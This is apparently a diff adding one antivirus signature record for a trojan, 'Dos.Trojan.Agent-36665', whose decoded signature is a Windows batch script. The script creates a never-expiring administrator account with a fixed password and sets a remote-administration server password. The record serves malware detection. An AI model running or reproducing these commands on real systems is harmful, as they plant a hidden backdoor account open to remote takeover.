@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36665
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off net user adminsaa kmkokmkm /add /expires:never net localgroup administrators adminsaa /add net localgroup users adminsaa /delete r_server.exe /stop r_server.exe /pass:kmkokmkm r_server.exe /pass:kmkokmkm exit exit
